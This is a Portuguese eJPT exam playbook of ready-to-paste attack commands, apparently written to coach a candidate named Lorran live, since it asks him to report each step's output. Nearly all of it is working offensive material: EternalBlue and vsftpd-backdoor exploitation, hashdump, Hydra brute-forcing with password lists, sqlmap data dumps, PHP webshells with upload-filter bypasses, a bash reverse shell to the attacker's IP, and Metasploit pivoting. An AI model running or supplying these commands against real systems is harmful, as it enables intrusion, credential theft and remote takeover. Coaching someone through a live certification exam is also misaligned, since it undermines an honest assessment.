# CENARIOS eJPT - COMANDOS EXATOS
Lorran, identifique o cenario, copie e cole os blocos na ordem.
Me manda o output de cada etapa antes de continuar.

===================================================================
## CENARIO 1: PORTA 445 ABERTA → MS17-010 (EternalBlue)
===================================================================

### ETAPA 1 - Confirmar vulnerabilidade
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.X

### OUTPUT ESPERADO (vulneravel):
# Host script results:
# | smb-vuln-ms17-010:
# |   VULNERABLE:

### ETAPA 2 - Iniciar Metasploit e configurar exploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.X
set LHOST 10.10.10.SUA_IP
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
show options
run

### ETAPA 3 - Dentro do Meterpreter (confirmacao)
getuid
sysinfo
ipconfig

### ETAPA 4 - Coletar informacoes
hashdump
run post/windows/gather/enum_shares
run post/windows/gather/enum_applications
shell

### ETAPA 5 - Dentro do shell Windows
whoami
whoami /priv
net user
net localgroup administrators
type C:\Users\Administrator\Desktop\flag.txt
dir C:\Users\

### SE FALHAR (try fallback):
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.X
set LHOST 10.10.10.SUA_IP
set SMBUser Administrator
run

===================================================================
## CENARIO 2: PORTA 21 ABERTA → FTP ANONYMOUS + BRUTE FORCE
===================================================================

### ETAPA 1 - Verificar anonymous login
nmap --script ftp-anon -p 21 10.10.10.X

### OUTPUT ESPERADO se anonymous OK:
# | ftp-anon: Anonymous FTP login allowed

### ETAPA 2 - Conectar manualmente como anonymous
ftp 10.10.10.X
# usuario: anonymous
# senha: (enter em branco ou qualquer email)
ls -la
get arquivo_interessante.txt
mget *

### ETAPA 3 - Verificar versao do FTP
nmap -sV -p 21 10.10.10.X

### SE VSFTPD 2.3.4 (backdoor!):
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.X
run
# Shell direto como root!

### ETAPA 4 - Brute force FTP (se nao anonymous)
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.X -t 4 -f
# Se nao tiver SecLists, crie uma lista:
echo -e "admin\nftp\nuser\nroot\nanonymous" > users_ftp.txt
echo -e "admin\npassword\n123456\nftp\nanonymous\n" > pass_ftp.txt
hydra -L users_ftp.txt -P pass_ftp.txt ftp://10.10.10.X -t 4 -f

### ETAPA 5 - Apos login FTP, verificar se pode upload (webshell)
ftp 10.10.10.X
# Logar com credenciais encontradas
put webshell.php
# Se subir arquivo PHP, acessar via navegador!

### Conteudo webshell PHP simples:
# echo '<?php system($_GET["cmd"]); ?>' > webshell.php
# Depois acesse: http://10.10.10.X/webshell.php?cmd=whoami

===================================================================
## CENARIO 3: PORTA 80 / 8080 → GOBUSTER + SQLMAP + WEBSHELL
===================================================================

### ETAPA 1 - Verificar o que tem
curl -s http://10.10.10.X/ | head -20
curl -I http://10.10.10.X/

### ETAPA 2 - Gobuster (enumeracao de diretorios)
gobuster dir -u http://10.10.10.X -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 50 -o gobuster_result.txt

### SE SecLists disponivel (mais completo):
gobuster dir -u http://10.10.10.X -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50 -o gobuster_medium.txt

### Ver resultados
cat gobuster_result.txt | grep -v "404"

### ETAPA 3 - Identificar parametros vulneraveis
# Teste manual: http://10.10.10.X/page.php?id=1'
# Se der erro SQL, use sqlmap:
sqlmap -u "http://10.10.10.X/page.php?id=1" --dbs --batch
sqlmap -u "http://10.10.10.X/page.php?id=1" -D banco_encontrado --tables --batch
sqlmap -u "http://10.10.10.X/page.php?id=1" -D banco_encontrado -T users --dump --batch

### SQLmap em formulario POST:
sqlmap -u "http://10.10.10.X/login.php" --data="username=admin&password=test" --dbs --batch

### ETAPA 4 - Upload de Webshell
# Se encontrar /upload ou /admin/upload via gobuster:

# Criar webshell PHP:
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php

# Se tiver filtro de extensao, tentar:
# shell.php5, shell.phtml, shell.php.jpg

# Apos upload, acessar:
curl "http://10.10.10.X/uploads/shell.php?cmd=id"
curl "http://10.10.10.X/uploads/shell.php?cmd=whoami"
curl "http://10.10.10.X/uploads/shell.php?cmd=cat+/etc/passwd"

### ETAPA 5 - Escalar para reverse shell via webshell
# Na sua maquina, escutar:
nc -lvnp 4444

# Via webshell (URL encode o & como %26):
curl "http://10.10.10.X/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/SEU_IP/4444+0>%261"

===================================================================
## CENARIO 4: PORTA 22 ABERTA → HYDRA SSH
===================================================================

### ETAPA 1 - Verificar versao SSH
nmap -sV -p 22 10.10.10.X
nmap --script ssh-auth-methods -p 22 10.10.10.X

### ETAPA 2 - Tentar credenciais comuns primeiro (manual)
ssh admin@10.10.10.X
ssh root@10.10.10.X
# Senhas: admin, password, 123456, root, toor

### ETAPA 3 - Brute force com hydra
# Usuario conhecido, wordlist de senhas:
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X -t 4 -f

# Lista de usuarios + wordlist:
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X -t 4 -f

# Se porta SSH nao for 22:
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://10.10.10.X -t 4 -f

### Lista minima de usuarios para tentar (copiar e colar):
echo -e "admin\nroot\nuser\nlorran\nftpuser\nwebadmin\nservice\ntest" > users_ssh.txt

### Lista minima de senhas para tentar:
echo -e "admin\npassword\n123456\npassword123\nadmin123\nroot\ntoor\nletmein\nqwerty\nwelcome\nservice\ntest" > pass_ssh.txt

hydra -L users_ssh.txt -P pass_ssh.txt ssh://10.10.10.X -t 4 -f -V

### ETAPA 4 - Conectar apos encontrar credenciais
ssh usuario@10.10.10.X
# Digitar senha encontrada pelo hydra

### ETAPA 5 - Dentro do SSH, coletar info
id
whoami
sudo -l          # verificar permissoes sudo
cat /etc/passwd
find / -perm -u=s -type f 2>/dev/null    # binarios SUID
find / -writable -type f 2>/dev/null | head -20
cat /home/*/flag*.txt 2>/dev/null
cat /root/flag.txt 2>/dev/null

===================================================================
## CENARIO 5: REDE /24 → PIVOTING COM METASPLOIT
===================================================================

### SITUACAO: Voce comprometeu 10.10.10.X e quer atacar 192.168.1.0/24

### ETAPA 1 - Confirmar sessao Meterpreter ativa
msfconsole -q
sessions -l
sessions -i 1

### ETAPA 2 - Mapear redes da maquina comprometida
# Dentro do Meterpreter:
ipconfig
route

### ETAPA 3 - Adicionar rota para rede interna
# Dentro do Meterpreter - colocar em background primeiro:
background
# No msfconsole:
route add 192.168.1.0/24 1
route print

### ETAPA 4 - Ou usar autoroute (mais simples)
# Ainda na sessao 1:
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.1.0
set NETMASK 255.255.255.0
run
back

### ETAPA 5 - Descobrir hosts vivos na rede interna
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
set SESSION 1
run

### ETAPA 6 - Scanner de portas pela rede pivotada
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,135,139,443,445,3389,8080
set THREADS 10
run

### ETAPA 7 - Portfwd (tunel para porta especifica)
# Entrar na sessao novamente:
sessions -i 1
# Criar tunel: localhost:8445 → 192.168.1.50:445
portfwd add -l 8445 -r 192.168.1.50 -p 445
# Criar tunel RDP: localhost:13389 → 192.168.1.50:3389
portfwd add -l 13389 -r 192.168.1.50 -p 3389

### ETAPA 8 - Usar SOCKS proxy para acesso total
background
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

### ETAPA 9 - Configurar proxychains
# Editar /etc/proxychains4.conf (ou proxychains.conf):
# Adicionar no final: socks5 127.0.0.1 1080
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

### ETAPA 10 - Usar nmap e ferramentas via proxy
proxychains nmap -sT -Pn 192.168.1.50
proxychains curl http://192.168.1.50
proxychains ssh user@192.168.1.50

===================================================================
## DICAS GERAIS DE EXAME

- SEMPRE salve outputs: comando | tee output.txt
- Anote cada IP e porta encontrada em notas.txt
- Me manda screenshot ou output completo do nmap ANTES de tentar exploit
- Flags geralmente em: /root/flag.txt, /home/user/flag.txt, C:\Users\Administrator\Desktop\flag.txt
- Se meterpreter cair, rode o exploit novamente
- Hashdump sempre depois de comprometer Windows

===================================================================
FIM DOS CENARIOS
